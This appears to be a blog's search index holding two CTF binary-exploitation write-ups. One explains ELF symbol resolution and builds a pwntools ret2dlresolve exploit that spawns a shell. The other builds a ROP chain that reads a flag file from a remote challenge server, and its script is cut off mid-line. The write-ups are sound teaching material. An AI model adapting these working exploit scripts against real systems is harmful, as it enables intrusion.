
{
    
    
    
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2025-01-14","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/how_functions_resolve/","summary":"While going through another one of those easy challenges (this one dealing with ret2dlresolve), I encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction I could not figure out what the exploit actually was. Thus I put on my gloves and decided to dig into the dl_resolve process.","tags":["ctf","linux","pwn","writeup"],"text":"while going through another one of those easy challenges (this one dealing with ret2dlresolve), i encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction i could not figure out what the exploit actually was. thus i put on my gloves and decided to dig into the dl_resolve process.\nfrom pwn import * elf = context.binary = elf(\u0026#39;./challenge_binary\u0026#39;) p = elf.process() rop = rop(elf) # create a resolver for the system function dlresolve = ret2dlresolvepayload(elf, symbol=\u0026#39;system\u0026#39;, args=[\u0026#39;/bin/sh\u0026#39;]) rop.raw(\u0026#39;a\u0026#39; * 72) # padding rop.read(0, dlresolve.data_addr) # read in the data and structures for the ret2dlresolve rop.ret2dlresolve(dlresolve) # trigger the linker to resolve system p.sendline(rop.chain()) # send the exploit p.sendline(dlresolve.payload) # send the relevant structures p.interactive() ps: no grudges against the author of the writeup or challenge. i am thankful for them to introduce me to a new topic.\ncontext information we are provided with an elf binary. i\u0026rsquo;ve tried my best to redact the challenge name.\nbinary executable security mitigation enumeration arch: amd64-64-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x400000) runpath: b\u0026#39;./glibc/\u0026#39; stripped: no source code analysis functions main\nint __cdecl main(int argc, const char **argv, const char **envp) { vuln(argc, argv, envp); return 0; } vuln\nssize_t vuln() { char buf[64]; // [rsp+0h] [rbp-40h] byref return read(0, buf, 0xc8ull); } vuln() is vulnerable to out-of-bounds write as it tries to read in 200 bytes within a 40 bytes buffer. exploitation avenues as there is not any target win() functions or call to juicy funtions like system(), we need to perform a ret2dlresolve attack to call system() by abusing the dynamic linking process of an elf.\nduring a ret2dlresolve, the attacker tricks the binary into resolving a function of its choice (such as system) into the plt. this then means the attacker can use the plt function as if it was originally part of the binary, bypassing aslr (if present) and requiring no libc leaks.\ndetailed overview of dynamic linking dynamically-linked elf objects import libc functions when they are first called using the plt and got. during the relocation of a runtime symbol, rip will jump to the plt and attempt to resolve the symbol. during this process a \u0026ldquo;resolver\u0026rdquo; is called.\nexample: calling read() in vuln()\nat vuln+25\n0x000000000040113b \u0026lt;+25\u0026gt;: call 0x401030 \u0026lt;read@plt\u0026gt; at read@plt\n0x401030 \u0026lt;read@plt\u0026gt;: jmp qword ptr [rip+0x2fe2] # 0x404018 \u0026lt;read@got.plt\u0026gt; 0x401036 \u0026lt;read@plt+6\u0026gt;: push 0x0 0x40103b \u0026lt;read@plt+11\u0026gt;: jmp 0x401020 first it jumps to read@got.plt, if the function is already linked this location is populated with the address of the target funtion. but on first call it points to the next instruction in the plt.\nat read@got.plt before first call to read\n0x404018 \u0026lt;read@got.plt\u0026gt;: 0x0000000000401036 as evident from above, at 0x401036 we push a byte (here 0x0) called reloc_arg (it is essentially the index of the elf32_rel/elf64_rela in jmprel table, example: read is at index 0) onto stack and jump to a predefined address (here 0x401020) called default stub. the reloc_arg is multiplied by size of elf64_rela (24) to get reloc_offset from the jmprel base address.\nat the stub, we push link_map ,a list with all the loaded libraries, to the stack and jump to an address loaded from start of the got section.\n0x401020: push qword ptr [rip+0x2fe2] # 0x404008 0x401026: jmp qword ptr [rip+0x2fe4] # 0x404010 here 0x404010 is the start of got section. at the start of got section there is a special address that lies within the ld.so\u0026rsquo;s memory range responsible for loading the dynamically linked libc function.\n0x404010: 0x00007ffff7fe8540 0x7ffff7fd3000 0x7ffff7ff3000 0x20000 0x1000 r-xp /challenge/glibc/ld-linux-x86-64.so.2 this leads to a function call of the form: _dl_runtime_resolve (link_map , rel_offset/relog_arg).\n_dl_runtime_resolve uses link_map list to resolve the symbol. after relocating the symbol, it populates the approriate entry in symtab, the initial call of read will be invoked following which the control returns to the instruction after the original call instruction to this funtion within the code, for every subsequent call the got section has been populated thorugh with the address of the function.\n0x404018 \u0026lt;read@got.plt\u0026gt;: 0x00007ffff7ee1780 understanding resolution sections and structures in elf in order to resolve the functions, there are 3 structures that need to exist within the binary. faking these 3 structures could enable us to trick the linker into resolving a function of our choice, and we can also pass parameters in (such as /bin/sh) once resolved.\nreadelf -d challenge_binary tag type name/value 0x0000000000000005 (strtab) 0x400390 0x0000000000000006 (symtab) 0x400330 0x0000000000000017 (jmprel) 0x400430 jmprel (.rel.plt) has an offset r_offset that stores the target got address where to store the resolved address and another index r_sym into the symtab (.dynsym) a symbol table, the structure at this offset has a member st_name which stores offset into strtab (.dynstr), a string table, for symbol name.\njmprel (.rel.plt) the jmprel segment stores the relocation table, which maps each entry to a symbol.\nx86 example elf:\nreadelf -r source relocation section \u0026#39;.rel.dyn\u0026#39; at offset 0x2d0 contains 1 entry: offset info type sym.value sym. name 0804bffc 00000206 r_386_glob_dat 00000000 __gmon_start__ relocation section \u0026#39;.rel.plt\u0026#39; at offset 0x2d8 contains 2 entries: offset info type sym.value sym. name 0804c00c 00000107 r_386_jump_slot 00000000 gets@glibc_2.0 0804c010 00000307 r_386_jump_slot 00000000 __libc_start_main@glibc_2.0 amd64 challenge_binary elf:\nreadelf -r challenge_binary relocation section \u0026#39;.rela.dyn\u0026#39; at offset 0x400 contains 2 entries: offset info type sym. value sym. name + addend 0000004031f0 000200000006 r_x86_64_glob_dat 0000000000000000 __libc_start_main@glibc_2.2.5 + 0 0000004031f8 000300000006 r_x86_64_glob_dat 0000000000000000 __gmon_start__ + 0 relocation section \u0026#39;.rela.plt\u0026#39; at offset 0x430 contains 1 entry: offset info type sym. value sym. name + addend 000000404018 000100000007 r_x86_64_jump_slo 0000000000000000 read@glibc_2.2.5 + 0 ida listing load:0000000000400400 ; elf rela relocation table load:0000000000400400 f0 31 40 00 00 00 00 00 06 00+elf64_rela \u0026lt;4031f0h, 200000006h, 0\u0026gt; ; r_x86_64_glob_dat __libc_start_main load:0000000000400418 f8 31 40 00 00 00 00 00 06 00+elf64_rela \u0026lt;4031f8h, 300000006h, 0\u0026gt; ; r_x86_64_glob_dat __gmon_start__ load:0000000000400430 ; elf jmprel relocation table load:0000000000400430 18 40 40 00 00 00 00 00 07 00+elf64_rela \u0026lt;404018h, 100000007h, 0\u0026gt; ; r_x86_64_jump_slot read load:0000000000400430 00 00 01 00 00 00 00 00 00 00+load ends these entries are of type elf32_rel (in x86 executable) and elf64_rela (in amd64 executable):\nx86\ntypedef uint32_t elf32_addr; typedef uint32_t elf32_word; typedef struct { elf32_addr r_offset; /* address */ elf32_word r_info; /* relocation type and symbol index */ } elf32_rel; /* how to extract and insert information held in the r_info field. */ #define elf32_r_sym(val) ((val) \u0026gt;\u0026gt; 8) #define elf32_r_type(val) ((val) \u0026amp; 0xff) the column name coresponds to our symbol name. the offset is the got entry for our symbol. info stores additional metadata. elf32_r_sym stores the index of the elf32_sym(see symtab section definition below) entry in symtab (symbol table) for the specified symbol.\ndue to value of info (visible in .rel.plt dump) the r_sym of gets is 1 as 0x107 \u0026raquo; 8 = 1.\namd64 (cleaner definition further below)\nusing elf64_addr = uint64_t; using elf64_xword = uint64_t; struct elf64_rela { elf64_addr r_offset; // location (file byte offset, or program virtual addr). elf64_xword r_info; // symbol table index and type of relocation to apply. // these accessors and mutators correspond to the elf64_r_sym, elf64_r_type, // and elf64_r_info macros defined in the elf specification: elf64_word getsymbol() const { return (r_info \u0026gt;\u0026gt; 32); } elf64_word gettype() const { return (elf64_word)(r_info \u0026amp; 0xffffffffl); } void setsymbol(elf64_word s) { setsymbolandtype(s, gettype()); } void settype(elf64_word t) { setsymbolandtype(getsymbol(), t); } void setsymbolandtype(elf64_word s, elf64_word t) { r_info = ((elf64_xword)s \u0026lt;\u0026lt; 32) + (t \u0026amp; 0xffffffffl); } }; the r_sym value of read (in challenge_binary elf) would be 1 (0x000100000007 \u0026raquo; 32).\nthe type r_386_jump_slot and r_x86_64_jump_slot means that the entry is for got section.\neg: ida\u0026rsquo;s listing of jumprel of example amd64 elf.\nload:04005c0 ; elf jmprel relocation table load:04005c0 elf64_rela \u0026lt;404018h, 200000007h, 0\u0026gt; ; r_x86_64_jump_slot write load:04005d8 elf64_rela \u0026lt;404020h, 300000007h, 0\u0026gt; ; r_x86_64_jump_slot strlen load:04005f0 elf64_rela \u0026lt;404028h, 400000007h, 0\u0026gt; ; r_x86_64_jump_slot setbuf load:0400608 elf64_rela \u0026lt;404030h, 500000007h, 0\u0026gt; ; r_x86_64_jump_slot read here the first value is r_offset (offset into got), the second value is r_info, the third value is r_addend (available in another definition of elf64_rela mentioned further below).\nnotice how the second value mentions the offset within the symtab table with the highest-order-byte - 2, 3, 4, 5 while the lowest-order-byte represents type 7 ie. r_x86_64_jump_slot.\ncleaner definition of elf64_rela typedef struct { elf64_addr r_offset; /* 64 bit - address */ elf64_xword r_info; /* 64 bit - relocation type and symbol index */ elf64_sxword r_addend; /* 64 bit - addend */ } elf64_rela; // 24 bytes /* how to extract and insert information held in the r_info field.*/ #define elf64_r_sym(i) ((i) \u0026gt;\u0026gt; 32) #define elf64_r_type(i) ((i) \u0026amp; 0xffffffff) #define elf64_r_info(sym,type) ((((elf64_xword) (sym)) \u0026lt;\u0026lt; 32) + (type)) strtab (.dynstr) strtab is a simple table that stores the strings for symbols name.\nida\u0026rsquo;s listing for strtab for challenge_binary\nload:0000000000400390 ; elf string table load:0000000000400390 00 unk_400390 db 0 ; data xref: load:0000000000400348↑o load:0000000000400390 ; load:0000000000400360↑o load:0000000000400390 ; load:0000000000400378↑o load:0000000000400390 ; load:00000000004003e0↓o load:0000000000400390 ; load:00000000004003f0↓o load:0000000000400391 72 65 61 64 00 aread db \u0026#39;read\u0026#39;,0 ; data xref: load:0000000000400348↑o load:0000000000400396 5f 5f 6c 69 62 63 5f 73 74 61+alibcstartmain db \u0026#39;__libc_start_main\u0026#39;,0 ; data xref: load:0000000000400360↑o load:00000000004003a8 6c 69 62 63 2e 73 6f 2e 36 00 alibcso6 db \u0026#39;libc.so.6\u0026#39;,0 ; data xref: load:00000000004003e0↓o load:00000000004003b2 47 4c 49 42 43 5f 32 2e 32 2e+aglibc225 db \u0026#39;glibc_2.2.5\u0026#39;,0 ; data xref: load:00000000004003f0↓o load:00000000004003be 2e 2f 67 6c 69 62 63 2f 00 aglibc db \u0026#39;./glibc/\u0026#39;,0 load:00000000004003c7 5f 5f 67 6d 6f 6e 5f 73 74 61+agmonstart db \u0026#39;__gmon_start__\u0026#39;,0 ; data xref: load:0000000000400378↑o symtab (.dynsym) this table holds relevant symbol information.\nx86 each entry is a elf32_sym structure and its size is 16 bytes.\ntypedef struct { elf32_word st_name ; /* symbol name (string tbl index) -4b*/ elf32_addr st_value ; /* symbol value -4b*/ elf32_word st_size ; /* symbol size -4b*/ unsigned char st_info ; /* symbol type and binding-1b */ unsigned char st_other ; /* symbol visibility under glibc\u0026gt;=2.2 -1b */ elf32_section st_shndx ; /* section index -2b*/ } elf32_sym; amd64 contains a symbol table using elf64_sym structures. every structure associates a symbolic name with a piece of code elsewhere in the binary.\ntypedef struct { elf64_word st_name; /* 32bit - symbol name (string tbl index) */ unsigned char st_info; /* symbol type and binding */ unsigned char st_other; /* symbol visibility */ elf64_section st_shndx; /* 16 bits - section index */ elf64_addr st_value; /* 64 bits - symbol value */ elf64_xword st_size; /* 64 bits - symbol size */ } elf64_sym; // 24 bytes st_name: it acts as a string table index. it will be used to locate the right string in the strtab section.\nst_info: symbol’s type and binding attributes.\nst_other: symbol’s visibility.\nst_shndx: the relevant section header table index.\nst_value: the value of the associated symbol.\nst_size: the symbol’s size. if the symbol has no size or the size is unknown, it contains 0.\nida listing challenge_binary\nload:0000000000400330 ; elf symbol table load:0000000000400330 00 00 00 00 00 00 00 00 00 00+elf64_sym \u0026lt;0\u0026gt; load:0000000000400348 01 00 00 00 12 00 00 00 00 00+elf64_sym \u0026lt;offset aread - offset unk_400390, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; load:0000000000400360 06 00 00 00 12 00 00 00 00 00+elf64_sym \u0026lt;offset alibcstartmain - offset unk_400390, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; load:0000000000400378 37 00 00 00 20 00 00 00 00 00+elf64_sym \u0026lt;offset agmonstart - offset unk_400390, 20h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__gmon_start__ ida listing example binary\nload:04003d8 ; elf symbol table load:04003d8 elf64_sym \u0026lt;0\u0026gt; load:04003f0 elf64_sym \u0026lt;offset alibcstartmain - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; load:0400408 elf64_sym \u0026lt;offset awrite - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;write\u0026#34; load:0400420 elf64_sym \u0026lt;offset astrlen - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;strlen\u0026#34; load:0400438 elf64_sym \u0026lt;offset asetbuf - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;setbuf\u0026#34; load:0400450 elf64_sym \u0026lt;offset aread - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; the most important value here is st_name as this gives the offset in strtab of the symbol name. the other fields are not relevant to the exploit itself.\njmprel, symtab and strtab for challenge_binary elf base section addresses\nreadelf -d challenge_binary tag type name/value 0x0000000000000005 (strtab) 0x400390 0x0000000000000006 (symtab) 0x400330 0x0000000000000017 (jmprel) 0x400430 jmprel entry for read\n(gdb) x/2gx 0x0000000000400430 + 0 0x400430: 0x0000000000404018 0x0000000100000007 |__ r_offset |___ r_info r_sym = (r_info \u0026raquo; 32) = 1\nsymtab at index 1\nx/6wx 0x400330 + 1 * 24 0x400348: 0x00000001 0x00000012 0x00000000 0x00000000 0x400358: 0x00000000 0x00000000 symtab base + index * size of elf64_sym st_name = 1 strtab at index 1\nx/s 0x0000000000400390 + 0x00000001 0x400391: \u0026#34;read\u0026#34; tl;dr function resolution pseudocode exmaple: calling read in x86 elf\n_dl_runtime_resolve(link_map, reloc_arg) { uintptr_t reloc_offset = reloc_arg * sizeof(elf64_rela); // reloc_arg is pushed in .plt section elf64_rela * rel_entry = jmprel + reloc_offset ; elf64_sym * sym_entry = \u0026amp;symtab[elf64_r_sym(rel_entry-\u0026gt;r_info)]; char * sym_name = strtab + sym_entry-\u0026gt;st_name ; _search_for_symbol_(link_map, sym_name); // invoke initial read call now that symbol is resolved read(0, buf, 0x100); } ret2dlresolve use .bss section to create fake entries, it is closer to the elf in memory compared to the stack.\nstep 1 we need to fake an elf64_rela structure and an elf64_sym structure with following characteristics\nfake elf64_rela (jmprel/.rel.plt) structure it must have a writeable r_offset area where _dl_runtime_resolve will write the address of system(). in the r_info attribute the lower 4 bytes (32 bits) must be equal to 7 ie. r_x86_64_jump_slot, while the higher 4 bytes should be constructed such that (r_info \u0026gt;\u0026gt; 32) * 24 (r_sym value * size of elf64_sym as r_sym is just index) when added to symtab address, points to fake elf64_sym. fake elf64_sym (symtab/.dynsym) structure the st_name value when added to strtab (.dynstr) address points to \u0026lsquo;system\u0026rsquo; string. step 2 with the fake structures in place, we calculate reloc_arg (offset usually pushed in a functions\u0026rsquo;s .plt section) from jmprel (.rel.plt) address to point to our fake elf64_rela structure.\nnext, we push the fake value of reloc_arg onto stack and transfer control to default stub at the start of .plt section to let dl_resolve do its magic.\ncrafting exploit as .bss section is writable at runtime, we use this space to create our fake structures.\nnote: make sure that index to fake .dynsym entry must be multiple of 24. if on dividing the address difference between our fake entry and symtab base we get a fraction this leads to variance in resultant address when recalculated by _dl_fixup during resolution as only the integer part would be stored in r_info as index.\nimport pwn #pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challenge_binary\u0026#34; elf = pwn.context.binary = pwn.elf(exe, checksec = false) rop = pwn.rop(elf) #proc = pwn.process(\u0026#34;./challenge_binary\u0026#34;) #proc = pwn.gdb.debug(\u0026#34;./challenge_binary\u0026#34;, gdbscript = \u0026#34;\u0026#34;\u0026#34; # b *0x000000000040113b # c # \u0026#34;\u0026#34;\u0026#34;) # important addresses plt_stub = elf.get_section_by_name(\u0026#34;.plt\u0026#34;)[\u0026#34;sh_addr\u0026#34;] bss = elf.get_section_by_name(\u0026#34;.bss\u0026#34;)[\u0026#34;sh_addr\u0026#34;] print(f\u0026#34;[*] .plt default stub at: {hex(plt_stub)}\u0026#34;) print(f\u0026#34;[*] .bss at: {hex(bss)}\u0026#34;) strtab, symtab, jmprel = map(elf.dynamic_value_by_tag, [\u0026#34;dt_strtab\u0026#34;, \u0026#34;dt_symtab\u0026#34;, \u0026#34;dt_jmprel\u0026#34;]) print(f\u0026#34;[*] strtab (.dynstr) at: {hex(strtab)}\u0026#34;) print(f\u0026#34;[*] symtab (.dynsym) at: {hex(symtab)}\u0026#34;) print(f\u0026#34;[*] jmprel (.rel.plt) at: {hex(jmprel)}\u0026#34;) def align(addr): return (0x18 - (addr) % 0x18) # payload 1 ============================= # 1. overflow into return address # 2. call read(0, .bss, size_of_fake_entries) # 3. return to vuln() \u0026#34;\u0026#34;\u0026#34; this function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. it will then find every string and number inside those and flatten them out. strings are inserted directly while numbers are packed using the :func:`pack` function. unicode strings are utf-8 encoded. examples \u0026gt;\u0026gt;\u0026gt; flat(4) b\u0026#39;\\x04\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat(b\u0026#39;x\u0026#39;) b\u0026#39;x\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat([1,2,3]) b\u0026#39;\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat({4:b\u0026#39;x\u0026#39;}) b\u0026#39;aaaax\u0026#39; \u0026#34;\u0026#34;\u0026#34; payload_1 = pwn.flat({ 72: [ # pad 72 bytes to overwrite buffer and rbp values pwn.p64(rop.rdi.address), pwn.p64(0), # read from stdin pwn.p64(rop.rsi.address), pwn.p64(bss), # read into .bss section pwn.p64(0), # junk for pop r15 # we do not have gadget to set rdx to size of next payload stage, but it has value 0xc8 when next instruction is called, we can work with that our as next stage is much smaller than 0xc8 (200) bytes elf.sym.read, # call read() elf.symbols[\u0026#34;vuln\u0026#34;], # return to vuln() after read() ] }) proc.sendline(payload_1) # payload 2 ============================ # 1. input value into previous read(0, .bss, size) call # a. create fake elf64_rel structure (.rel.plt) # b. create fake elf64_sym structure (.dynsym) # c. write string \u0026#39;system\u0026#39; for .dynstr resolution of symbol name # d. write string \u0026#39;/bin/sh\u0026#39; for passing as argument to system later # 2. let return to vuln() as proposed in payload 1 \u0026#34;\u0026#34;\u0026#34; typedef struct { elf64_addr r_offset; /* 64 bit - address */ elf64_xword r_info; /* 64 bit - relocation type and symbol index */ elf64_sxword r_addend; /* 64 bit - addend */ } elf64_rela; // 24 bytes \u0026#34;\u0026#34;\u0026#34; # fake elf64_sym is at 24 bytes (size of fake elf64_rela - jmprel entry) after bss. index must be offset from symtab base. #dynsym_idx = ((bss + 24) - symtab) // 24 \u0026lt;-- this resulted in an index in fraction, we need to align the address to 24 byte structures. padding = align(bss - symtab) fake_structs = bss + padding dynsym_idx = ((fake_structs + 24) - symtab) // 24 r_info = (dynsym_idx \u0026lt;\u0026lt; 32) | 0x7 # fake elf64_sym entry must contain offset to symbol name from strtab. dynstr_off = (fake_structs + 48) - strtab payload_2 = pwn.flat({ 0: [ # fake elf64_rela entry for jmprel bss, # r_offset - a write address to write address of system after resolution r_info, # r_info - indexes into our fake .dynsym entry pwn.p64(0), # r_addend - zero, not needed for our purposes b\u0026#39;\\x00\u0026#39; * padding, # added padding to make 24 byte (structure size) alignment as dynsym_idx (in r_info) must be exact multiple of 24 @ss pwn.p32(dynstr_off), # st_name - offset from strtab for our symbol name pwn.p32(0) * 5, # other 20 bytes, not needed for our purposes # target symbol name to be referenced from strtab through our symtab entry \u0026#34;system\\x00\\x00\u0026#34;, # argument to system \u0026#34;/bin/sh\\x00\u0026#34;, ] }) payload_2 = payload_2 + b\u0026#39;a\u0026#39; * (200 - len(payload_2)) # proc.sendline() was buggy so i filled entire 200 byte limit in count of read() proc.send(payload_2) # payload 3 ============================ # 1. overflow into the return address # 2. push reloc_arg (that resolves to start of our fake structure region) # 3. return to plt default stub # 4. profit binsh_addr = fake_structs + 24 + 24 + 8 # start of fake structs + size of elf64_rela + size of elf64_sym + length of \u0026#39;system\\x00\\x00\u0026#39; reloc_arg = (fake_structs - jmprel) // 24 payload_3 = pwn.flat({ 72: [ pwn.p64(rop.rdi.address), # setup argument for system() pwn.p64(binsh_addr), plt_stub, # to call dl_resolve reloc_arg, # plt stub assumes that the offset to jmprel entry is already pushed ] }) proc.send(payload_3) proc.interactive() post exploitation post-exploitation i drated a meme that looked cool to me and adhered to then meme trends.\n","title":"How are functions resolved: A jump across tables into dl_resolve"},{"date":"2024-10-05","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/tracing_file_descriptors/","summary":"I was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit against the remote challenge service and failed. Referring to the writeup document I found this:\nThere was no explanation regarding the value of file-descriptor. Thus I went on a quest to trace for the value.","tags":["ctf","linux","pwn","writeup"],"text":"i was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. after successfully pwning the binary locally, i ran my exploit against the remote challenge service and failed. referring to the writeup document i found this:\nthere was no explanation regarding the value of file-descriptor. thus i went on a quest to trace for the value.\nps: please bear with me while we fight togther to tally all those numbers :) (i tried my best to redact challenge name)\ncontext information we are provided with challenge elf binary named challengebinary, and a dockerfile to create docker container with binary and fake flag.\nexecutable mitigation information arch: amd64-64-little relro: full relro stack: no canary found nx: nx enabled pie: no pie (0x400000) stripped: no source code analysis (decompilation) main()\nint __cdecl main(int argc, const char **argv, const char **envp) { char s1[8]; // [rsp+0h] [rbp-40h] byref __int64 v5; // [rsp+8h] [rbp-38h] int v6; // [rsp+10h] [rbp-30h] __int64 buf[2]; // [rsp+20h] [rbp-20h] byref int fd; // [rsp+34h] [rbp-ch] unsigned __int64 i; // [rsp+38h] [rbp-8h] banner(argc, argv, envp); buf[0] = 0ll; buf[1] = 0ll; fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, buf, 8ull); printf(\u0026#34;\\n[strange man in mask screams some nonsense]: %s\\n\\n\u0026#34;, (const char *)buf); close(fd); *(_qword *)s1 = 0ll; v5 = 0ll; v6 = 0; printf(\u0026#34;[strange man in mask]: in order to proceed, tell us the secret phrase: \u0026#34;); __isoc99_scanf(\u0026#34;%16s\u0026#34;, s1); for ( i = 0ll; i \u0026lt;= 0xe; ++i ) { if ( s1[i] == 10 ) { s1[i] = 0; break; } } if ( !strncmp(s1, \u0026#34;s34s0nf1n4l3b00\u0026#34;, 0xfull) ) challenge_function(); else printf(\u0026#34;%s\\n[strange man in mask]: sorry, you are not allowed to enter here!\\n\\n\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;); return 0; } the program opens up /dev/random at provides the user with 8 bytes of randomness it asks for a secret phrase (compared with s34s0nf1n4l3b00), if the phrase matches it calls challenge_function() challenge_function()\nssize_t challenge_function() { char buf[64]; // [rsp+0h] [rbp-40h] byref printf(\u0026#34;\\n[strange man in mask]: season finale is here! take this souvenir with you for good luck: [%p]\u0026#34;, buf); printf(\u0026#34;\\n\\n[strange man in mask]: now, tell us a wish for next year: \u0026#34;); fflush(stdin); fflush(_bss_start); read(0, buf, 0x1000ull); return write(1, \u0026#34;\\n[strange man in mask]: that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;, 0x54ull); } it discloses a stack address (of input buffer). it reads 4096 bytes into a 64 byte array. vulnerability as nx is enabled, but it is a no pie binary, we can possibly rop. we also have stack address leak to store data in our ropchain.\nexploitation exploit development we do not have a pop rdi ; ret gadget, but the moment challenge_function() returns, rdx stores 0x54 which would suffice for us, if flag is larger in size we would have to read it in 84 byte chunks, not an issue :).\nthe call to open() sets rdx to 0, so we return back to challenge_function() and send a second ropchain to read the flag from opened file.\nimport pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.process(exe) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; would be 3 if program closed all the files it had opened before this call pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(3), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(3, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34; the script worked locally, but failed on remote instance.\ntroubleshooting i made slight change to the dockerfile to install strace and use it to trace my calls\nfrom ubuntu:20.04 env debian_frontend noninteractive run apt-get update --fix-missing \u0026amp;\u0026amp; apt-get -y upgrade run apt-get install -y socat strace run useradd -m ctf copy challenge/* /home/ctf/ run chown -r ctf:ctf /home/ctf/ workdir /home/ctf user ctf expose 9001/tcp entrypoint [\u0026#34;strace\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;socat\u0026#34;, \u0026#34;tcp-listen:9001,fork\u0026#34;, \u0026#34;exec:\u0026#39;./challengebinary\u0026#39;\u0026#34;] when i ran my exploit against the docker container, i observed that contrary to my assumption of fd being 3, when flag.txt was opened it was assigned 5 fd number.\n~$ docker run -it -p 9001:9001 --rm --name=challengebinary challenge | grep open openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libwrap.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libutil.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libssl.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libcrypto.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libnsl.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libpthread.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;, o_rdonly|o_cloexec) = 3 [pid 11] openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/dev/urandom\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 [pid 11] openat(at_fdcwd, \u0026#34;flag.txt\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 updating the exploit script, it worked for remote instance\nfinal exploit script import pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.remote(\u0026#34;83.136.251.168\u0026#34;, 39139) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = 